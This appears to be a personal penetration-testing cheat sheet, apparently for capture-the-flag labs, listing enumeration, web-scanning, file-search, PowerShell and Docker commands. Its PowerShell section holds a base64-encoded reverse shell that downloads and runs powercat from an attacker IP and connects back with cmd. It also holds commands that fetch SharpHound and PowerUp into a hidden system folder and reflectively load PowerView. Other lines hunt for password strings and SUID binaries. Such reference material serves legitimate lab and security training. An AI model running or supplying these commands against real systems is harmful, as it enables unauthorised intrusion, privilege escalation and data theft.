# Commands

## vi

```sh
cat /etc/vim/vimrc.local 
set paste
set cursorline
set number
```

## Enumeration 

```sh
sudo masscan -p1-65535 10.10.10.77 --rate=1000 -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
sudo nmap -Pn -sV -sC -p$ports 10.10.10.77 -oA nmap
```

## Web

```sh
curl -v -X OPTIONS http://192.168.1.105/test

gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://192.168.1.159:80 -o gob_common_80.txt
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -l -t 30 -e -k -x .html,.php -u http://192.168.1.159:80 -o go_medium_80.txt

nikto -host 192.168.1.159:8080 | tee nikto_192.168.1.159_8080.txt
```

## Find

```sh
find / -perm -4000 2> /dev/null
grep -iR "pass" * | more
```

## Powershell

### Encoded commands

```sh
$command="ls"
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))
powershell.exe -encoded $Encoded
```
Reverse Shell

```sh
$command={IEX(New-Object System.Net.WebClient).DownloadString('http://10.13.14.3:9000/powercat.ps1'); powercat -c 10.13.14.3 -p 1234 -e cmd}
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))

$command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.13.14.3:9000/Invoke-PowerShellTcpRun.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
```

Port Scanning

```sh
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("localhost", $_)) "Port $_ is open!")) 2>$null
```

Downloading

```sh
$url="http://10.10.14.13:9000/SharpHound.exe"
$output="C:\Windows\System32\spool\drivers\color\SharpHound.exe"
(New-object system.net.webclient).downloadfile($url,$output)

(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.13:9000/PowerUp.ps1", "C:\Windows\System32\spool\drivers\color\PowerUp.ps1")
```

Reflective Downloading

```sh
IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.7:9000/PowerView.ps1')
```

Size of Folder

```sh
"{0} MB" -f ((Get-ChildItem C:\users\ -Recurse -force | Measure-Object -Property Length -Sum -ErrorAction Stop).Sum / 1MB)
```

Compress

```sh
Compress-Archive -LiteralPath <PathToFolder> -DestinationPath <PathToDestination>
```
Find Files

```sh
gci -force -recurse -file -ea silentlycontinue  

Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -force -ErrorAction SilentlyContinue

FindDate=Get-Date -Year 2016 -Month 06 -Day 24
Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate }
Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate -and $_.LastWriteTime -le $Finddate.adddays(1) }
```
## Docker
 
``` 

docker pull nginx:1.19.4-alpine
docker images
docker run --name my-nginx -d -p 9080:80 nginx:1.19.4-alpine # -d: detached mode
docker logs -f my-nginx # -f: like tail -f, follow the log
docker inspect my-nginx

# Having a Dockerfile

docker build -t xxx:yyy .

# Running

docker ps # running containers
docker ps -a  # also not running
docker ps -q # quite, only IDs

docker start [container]
docker stop [container]
docker restart [container]

docker exec -ti my-nginx /bin/sh
docker run -ti --rm --name my-ngnix nginx:1.19.4-alpine /bin/sh

# Mount folder

docker run -ti --rm --name my-ngnix -v /home/kali:/mnt nginx:1.19.4-alpine /bin/sh 


docker kill $(docker ps -q)
docker rm $(docker ps -a -q)

# Dangling images

docker images --filter "dangling=true"
docker rmi $(docker images -q --filter "dangling=true")

docker system prune -a
```

## Useful links

<https://github.com/swisskyrepo/PayloadsAllTheThings>

<https://book.hacktricks.xyz/>

<https://gtfobins.github.io/>

<https://github.com/LOLBAS-Project/LOLBAS/blob/master/README.md>

<https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf>

